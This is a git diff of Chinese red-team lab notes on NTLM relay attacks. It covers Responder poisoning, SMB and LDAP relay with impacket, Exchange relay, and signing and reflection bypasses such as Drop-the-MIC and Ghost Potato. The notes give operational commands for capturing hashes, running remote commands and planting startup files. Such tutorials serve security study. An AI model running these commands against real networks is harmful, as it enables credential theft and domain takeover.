@@ -17,11 +17,18 @@ NTLM Relay 中，我们就是要将截获的 Net-NTLM Hash 重放来进行攻击
 ---
 
 **相关文章**
-- [内网渗透测试：NTLM Relay攻击分析](https://blog.csdn.net/whatday/article/details/107698383)
 - [Windows内网协议学习NTLM篇之NTLM基础介绍](https://www.anquanke.com/post/id/193149)
 - [Windows内网协议学习NTLM篇之发起NTLM请求](https://www.anquanke.com/post/id/193493)
 - [Windows内网协议学习NTLM篇之Net-NTLM利用](https://www.anquanke.com/post/id/194069)
 - [Windows内网协议学习NTLM篇之漏洞概述](https://www.anquanke.com/post/id/194514)
+- [内网渗透测试：NTLM Relay攻击分析](https://blog.csdn.net/whatday/article/details/107698383)
+- [NTLM利用探索](http://evilash.me/2020/12/03/NTLMExplore.html)
+- [What is old is new again: The Relay Attack](https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/)
+- [NTLM relay of ADWS (WCF) connections with Impacket](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/)
+- [红队与理论：Credential Relay 与 EPA](https://mp.weixin.qq.com/s/hACLQ4UgdFXDdlB4CKKhXg)
+- [360 A-TEAM 带你走进 NTLM-Relay](https://mp.weixin.qq.com/s/aemG5XwVdyzNbOBXztDUbA)
+- [NTLM Relay](https://en.hackndo.com/ntlm-relay/)
+- [NTLM认证相关攻击技巧（较全）](https://xz.aliyun.com/t/8562)
 
 ---
 
@@ -38,7 +45,7 @@ Windows系统名称解析顺序为：
 
 也就是说，如果在缓存中没有找到名称，DNS 名称服务器又请求失败时，Windows 系统就会通过链路本地多播名称解析（LLMNR）和 Net-BIOS 名称服务（NBT-NS）在本地进行名称解析。
 
-这时，客户端就会将未经认证的 UDP 广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。当用户输入不存在、包含错误或者 DNS 中没有的主机名时，通过工具 (responder) 监听 LLMNR 和 NetBIOS 广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。核心过程与 arp 欺骗类似，我们可以让攻击者作中间人，截获到客户端的 Net-NTLMHash。
+这时，客户端就会将未经认证的 UDP 广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。当用户输入不存在、包含错误或者 DNS 中没有的主机名时，通过工具 (responder) 监听 LLMNR 和 NetBIOS 广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登录凭证。核心过程与 arp 欺骗类似，我们可以让攻击者作中间人，截获到客户端的 Net-NTLMHash。
 
 也就是说 LLMNR 并不需要一个服务器，而是采用广播包的形式，去询问 DNS，如同 ARP 投毒一样的安全问题。
 
@@ -74,7 +81,7 @@ WPAD 网络代理自动发现协议是一种客户端使用 DCHP、DNS、LLMNR�
 
 受害者通过 llmnr 询问 wpad 主机在哪里，Responder 通过 llmnr 投毒将 wpad 的 ip 指向 Responder 所在的服务器
 
-Responder 可以创建一个假 WPAD 服务器，并响应客户端的 WPAD 名称解析。 然后客户端请求这个假 WPAD 服务器的 wpad.dat 文件。
+Responder 可以创建一个假 WPAD 服务器，并响应客户端的 WPAD 名称解析。客户机随后请求该 WPAD服务器的 wpad.dat 文件。
 
 受害者访问 WPAD/wpad.dat，Responder 就能获取到用户的 net-ntlm hash(这个 Responder 默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上 - F 开启)
 
@@ -136,6 +143,27 @@ impacket-ntlmrelayx -6 -wh test.local -t smb://192.168.141.129 -l ~/tmp/ -socks 
 
 # 利用
 
+## signing
+
+签名的原理参考笔记 [认证](../../../../Integrated/Windows/笔记/认证.md)
+
+用 responder 工具包里面的 RunFinger.py 脚本扫描域内机器的签名的开放情况
+```
+cd /usr/share/responder/tools
+python RunFinger.py -i 192.168.141.0/24
+```
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/1.png)
+
+可以看到除了域控 130，域内主机的 SMB 签名都已禁用（false）了
+
+也可以用 nmap
+```
+nmap --script smb-security-mode,smb-os-discovery.nse -p445 192.168.141.0/24 --open
+```
+
+---
+
 ## SMB中继
 
 SMB 中继是最直接最有效的方法。可以直接控制该服务器 (包括但不限于在远程服务器上执行命令、上传 exe 到远程主机上执行、dump 服务器的用户 hash 等等)。
@@ -158,33 +186,9 @@ SMB 中继是最直接最有效的方法。可以直接控制该服务器 (包�
 - 域管 == 中继
 - 域普通用户+域管理员组 == 中继
 
-## 签名
-
-一般情况下，域控会默认开启，而 Windows 单机默认都不会开
-
-关闭 SMB 签名验证的命令： Windows Server 系列中 RequireSecuritySignature 子键默认值为 1
-```
-reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f
-```
-
-用 responder 工具包里面的 RunFinger.py 脚本扫描域内机器的 SMB 签名的开放情况
-```
-cd /usr/share/responder/tools
-python RunFinger.py -i 192.168.141.0/24
-```
-
-![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/1.png)
-
-可以看到除了域控 130，域内主机的 SMB 签名都已禁用（false）了
-
-也可以用 nmap
-```
-nmap --script smb-security-mode,smb-os-discovery.nse -p445 192.168.141.0/24 --open
-```
-
 ---
 
-## responder MultiRelay
+### responder MultiRelay
 
 利用 MultiRelay.py 攻击，获得目标主机的 shell：
 ```
@@ -223,7 +227,7 @@ net use \\whoami
 
 ---
 
-## Impacket smbrelayx
+### Impacket smbrelayx
 
 ```
 impacket-smbrelayx -h <被攻击ip> -c whoami
@@ -249,19 +253,7 @@ impacket-smbrelayx -h <被攻击ip> -e shell.exe
 
 ---
 
-## Metasploit smb_relay(08-068)
-
-当拿到用户的 smb 请求之后，最直接的就是把请求 Relay 回用户本身，即 Reflect。从而控制机子本身。漏洞危害特别高。
-
-然而微软在 ms08-068 中对 smb reflect 到 smb 做了限制，防止了同一主机从 SMB 协议向 SMB 协议的 Net-NTLMhash relay。防止凭据重播的做法如下:
-
-主机 A 向主机 B(访问 \\B) 进行 SMB 认证的时候，将 pszTargetName 设置为 cifs/B, 然后在 type 2 拿到主机 B 发送 Challenge 之后，在 lsass 里面缓存 (Challenge,cifs/B)。
-
-然后主机 B 在拿到主机 A 的 type 3 之后，会去 lsass 里面有没有缓存 (Challenge,cifs/b)，如果存在缓存，那么认证失败。
-
-这种情况底下，如果主机 B 和主机 A 是不同的主机的话，那 lsass 里面就不会缓存 (Challenge,cifs/B)。如果是同一台主机的话，那 lsass 里面肯定有缓存，这个时候就会认证失败。
-
-这个补丁在 CVE-2019-1384(Ghost Potato) 被绕过。
+### Metasploit smb_relay(08-068)
 
 ```
 use exploit/windows/smb/smb_relay
@@ -272,7 +264,7 @@ run
 
 ---
 
-## Impcaket ntlmrelayx
+### Impcaket ntlmrelayx
 
 ntlmrelayx 脚本可以直接用现有的 hash 去尝试重放指定的机器
 ```
@@ -288,3 +280,242 @@ impacket-ntlmrelayx -t smb://<被攻击ip> -c whoami -smb2support
 攻击者的 ntlmrelayx 上面即可显示成功在目标上执行命令
 
 ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/12.png)
+
+**socks**
+```
+echo "192.168.141.130" >> targets.txt
+echo "192.168.141.131" >> targets.txt
+echo "192.168.141.132" >> targets.txt
+echo "192.168.141.133" >> targets.txt
+
+impacket-ntlmrelayx -tf targets.txt -socks -smb2support
+```
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/24.png)
+
+**ADWS**
+
+kali 上启用(192.168.141.129)
+```
+impacket-ntlmrelayx --no-smb-server --no-http-server -t rpc://192.168.141.132 -c "echo a > c:\test"
+```
+
+域控上执行
+```
+Get-Command
+get-aduser -filter * -server 192.168.141.129
+```
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/25.png)
+
+目标域成员机器执行命令
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/26.png)
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/27.png)
+
+---
+
+## Exchange中继
+
+Exchange 的认证也支持 NTLM SSP。我们可以 relay 的 Exchange，从而收发邮件，代理等等。
+
+在使用 outlook 的情况下还可以通过 homepage 或者下发规则达到命令执行的效果。
+
+在 outlook 邮件中插入 HTML,触发 UNC
+
+这种 Relay，可以在外网发起 relay，而不需要在内网。
+
+- [Arno0x/NtlmRelayToEWS](https://github.com/Arno0x/NtlmRelayToEWS)
+- [quickbreach/ExchangeRelayX](https://github.com/quickbreach/ExchangeRelayX)
+
+### CVE-2018-8581
+
+这个漏洞最早是一个 SSRF 漏洞。可以访问任意用户的邮件。
+
+该漏洞由 SSRF 漏洞结合 NTLM_RELAY 可以访问任意用户的邮件，获取域管权限。按照 Relay 的一般流程，从而达到获取域管的效果。
+
+**相关文章**
+- [Exchange CVE-2018-8581 补丁有用？没用？](https://mp.weixin.qq.com/s/5nPUhIpUB5sR2bmP_getyw)
+
+**relay 到 EWS 接口**
+
+由于 Exchange 是以 System 用户的权限运行, 因此我们拿到的是机器用户的 Net-Ntlm Hash。并不能直接用以登录。但是 Exchange 机器用户可以获得 TokenSerializationRight 的 ”特权” 会话，可以 Relay 到 机子本身的 Ews 接口，然后可以使用 SOAP 请求头来冒充任何用户。
+- https://github.com/WyAtu/CVE-2018-8581
+
+**relay 到 LDAP**
+
+所有的 Exchange Server 都在 Exchange Windows Permissions 组里面, 而这个组默认就对域有 WriteACL 权限.
+
+因此我们可以 relay 到 LDAP, 而又由于 Relay 到的服务端是 Ldap,Ldap 服务器的默认策略是协商签名。而不是强制签名。是否签名由客户端决定。在 SSRF 里面发起的请求是 http 协议，http 协议是不要求进行签名.
+
+---
+
+## LDAP 中继
+
+### LDAP签名
+
+在默认情况底下，ldap 服务器就在域控里面，而且默认策略就是协商签名。而不是强制签名。是否签名是有客户端决定的。服务端跟客户端协商是否签名。
+
+客户端分情况，如果是 smb 协议的话，默认要求签名的，如果是 webadv 或者 http 协议，是不要求签名的
+
+微软公司于 2019-09-11 日发布相关通告称微软计划于 2020 年 1 月发布安全更新。为了提升域控制器的安全性，该安全更新将强制开启所有域控制器上 LDAP channel binding 与 LDAP signing 功能。
+
+### Impcaket ntlmrelayx
+
+**高权限用户**
+
+如果 NTLM 发起用户在以下用户组
+- Enterprise admins
+- Domain admins
+- Built-in Administrators
+- Backup operators
+- Account operators
+
+那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管
+
+**write-acl 权限**
+
+如果发起者对域有 write-acl 权限，那么就可以在域内添加两台 acl
+```
+'DS-Replication-Get-Changes'     = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+```
+acl 的受托人可以是任意用户，从而使得该用户可以具备 dcsync 的权限
+
+**普通用户权限**
+
+在 server2012r2 之后，如果没有以上两个权限。可以通过设置基于资源的约束委派。
+
+在 NTLM 发起者属性 msDS-AllowedToActOnBehalfOfOtherIdentity 里面添加一条 ace, 可以让任何机器用户和服务用户可以控制该用户 (NTLM 发起者)。
+
+---
+
+## 绕过
+
+### CVE-2015-0005
+
+在签名的情况底下。对于攻击者，由于没有用户 hash，也就没办法生成 keyexchangekey，虽然在流量里面能够拿到 encryptedrandomsessionkey，但是没有 keyexchangekey，也就没办法算出 exportedsession_key，也就没法对流量进行加解密。从而进行 Relay。
+
+攻击者一旦拿到 keyexchangekey 的话，就可以进行 Relay。而 CVE-2015-0005 正好是泄漏了这个 key，因此这里单独拿出来说说。
+
+在域内进行 NTLMRELAY 的时候，如果登录的用户是域用户，这个时候认证服务器本地是没有域用户的 hash 的，这个时候会通过 NETLOGON 把 type 1,type 2,type 3 全部发给域控，让域控去判断。并不是向域控索要域用户的 hash。那在认证之后，由于没有用户的 hash，也没有办法算出 keyexchangekey，这个时候认证服务器就会通过 NETLOGON 去找域控索要 keyexchangekey。从而算出 exportedsession_key。
+
+但是这个漏洞就出在，不是只有认证服务器才能找域控索要 keyexchangekey，只要是机器用户来索要 keyexchangekey，域控都会给，并没有做鉴权。我们拥有一个机器用户的话,任何加入域的计算机都可以针对域控制器验证任何传递身份验证，可以去找域控索要 keyexchangekey，然后配合流量里面的 encryptedrandomsessionkey 算出 exportedsessionkey，使用 exportedsession_key 进行加解密。
+
+该漏洞利用，在 impacket 的 `smbrelayx.py` 已经集成,不需要指定额外的参数,提供一个机器用户以及他的凭据，当发现服务端要求进行签名的时候就会自动调用
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/18.png)
+
+---
+
+### CVE-2019-1040
+
+`Drop the MIC`
+
+此漏洞表明，即使仅删除了 MIC（即使该标志指示其存在），服务器也接受了身份验证。
+```
+impacket-ntlmrelayx -t ldaps://192.168.141.132 --remove-mic -smb2support
+```
+
+---
+
+## NTLM 反射
+
+### MS08-068
+
+> MS08-068 修复的是，无法再将 Net-NTLM 哈希值传回到发起请求的机器上，除非进行跨协议转发
+
+在这之前，当拿到用户的 smb 请求之后，最直接的就是把请求 Relay 回用户本身，即 Reflect。从而控制机子本身。漏洞危害特别高。微软在 kb957097 补丁里面通过修改 SMB 身份验证答复的验证方式来防止凭据重播，从而解决了该漏洞。
+
+主机 A 向主机 B(访问 `\\B`) 进行 SMB 认证的时候，将 pszTargetName 设置为 cifs/B, 然后在 type 2 拿到主机 B 发送 Challenge 之后，在 lsass 里面缓存 (Challenge,cifs/B)。
+
+然后主机 B 在拿到主机 A 的 type 3 之后，会去查看 lsass 里面有没有缓存 (Challenge,cifs/b)，如果存在缓存，那么认证失败。
+
+这种情况底下，如果主机 B 和主机 A 是不同的主机的话，那 lsass 里面就不会缓存 (Challenge,cifs/B)。如果是同一台主机的话，那 lsass 里面肯定有缓存，这个时候就会认证失败。
+
+这个补丁在 CVE-2019-1384(Ghost Potato) 被绕过。
+
+---
+
+### MS16-075
+
+`Hot Potato`
+
+> MS16-075 之后微软修复了 http->smb 的本机 relay
+
+一个典型的 NTLM_RELAY 利用链。
+
+1. 发起 ntlm 请求
+    1. 配合 NBNS 投毒欺骗和伪造 WPAD 代理服务器, 发起 ntlm 请求请求, 拿到用户的 Net-NTML hash
+    2. 所有的 HTTP 请求将会被重定向至 “http://localhost/GETHASHESxxxxx”
+    3. 其中的 xxxxx 表示的是某些唯一标识符。将会影响目标主机中所有的用户，包括管理员账户和系统账户。
+
+2. 拿到 ntlm 请求
+    1. MS08-068 虽然限制了同台主机之间 smb 到 smb 的 Relay，但是并没有限制从 http 到 smb
+    2. 配合 NBNS 投毒欺骗和伪造 WPAD 代理服务器拿到的 ntlm 请求说 http 的形式，我们可以直接 relay 到本机的 smb。
+
+3. 服务端是否要求签名
+    3. 我们 Relay 到的服务端协议是 smb，除非是域内的域控，不然在工作组环节底下，或者域内的域成员机器，都是不要求签名的。
+
+为了绕过这个限制需要将 type2(NTLMSSP_CHALLENGE)Negotiate Flags 中的 0x00004000 设置为 0，但是设置为 0 后会出现另外一个问题那就是 MIC 验证会不通过，为了绕过这个限制又需要把 type2 Negotiate Flags 中的 `Negotiate Always Sign` 设置为 0
+
+---
+
+### CVE-2019-1384
+
+`Ghost potato`
+
+**相关文章**
+- [Ghost Potato](https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html)
+- [Ghost potato实际利用](https://www.lz1y.cn/2019/11/19/Ghost-potato%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8/index.html)
+- [Ghost Potato 复现(Cve-2019-1384)](https://xz.aliyun.com/t/7087)
+
+这个漏洞绕过了 MS08-068 之后，用户不能 relay 回本机的限制。
+
+先来回顾下 MS08-068 是怎么防止 Relay 的。
+1. 主机 A 向主机 B(访问 \\B)进行 SMB 认证的时候，将 pszTargetName 设置为 cifs/B, 然后在 type 2 拿到主机 B 发送 Challenge 之后，在 lsass 里面缓存(Challenge,cifs/B)。
+2. 然后主机 B 在拿到主机 A 的 type 3 之后，会去 lsass 里面有没有缓存(Challenge,cifs/b)，如果存在缓存，那么认证失败。
+3. 这种情况底下，如果主机 B 和主机 A 是不同的主机的话，那 lsass 里面就不会缓存(Challenge,cifs/B)。如果是同一台主机的话，那 lsass 里面肯定有缓存，这个时候就会认证失败。
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/19.png)
+
+然而这个缓存 (Challenge,cifs/B) 是有时效性的，这个时间是 300 秒，也就是说 300 秒后，缓存 (Challenge,cifs/B) 就会被清空，这个时候即使主机 A 和主机 B 是同一台主机，那么由于缓存已经被清除，那么去 lsass 里面肯定找不到缓存(Challenge,cifs/B)。
+
+![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/20.png)
+
+- https://shenaniganslabs.io/files/impacket-ghostpotato.zip
+    ```
+    cd impacket-ghostpotato
+    pip uninstall impacket
+    pip install .
+    cd examples
+    python ntlmrelayx.py -t smb://192.168.141.131 -smb2support --gpotato-startup exploit.txt
+    ```
+
+    ```
+    responder -I eth0 --lm
+    ```
+
+    使用 IE 浏览器进行访问
+
+    ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/21.png)
+
+    等待五分十五秒
+
+    ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/22.png)
+
+    POC 会自动上传文件到 WIndows 启动目录，用户下次登录时自启动
+
+    ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/NTLM中继/23.png)
+
+- [Lz1y/impacket-ghostpotato](https://github.com/Lz1y/impacket-ghostpotato)
+    ```
+    cd impacket-ghostpotato
+    pip uninstall impacket
+    pip install .
+    cd examples
+    python ntlmrelayx.py --no-smb-server -smb2support
+    ```
+
+这里需要注意的是这里当然也受到 kb2871997 的限制，所以在 Windows 2012 以及之后的版本中也需要 rid500 的账户才能成功，后续也一样
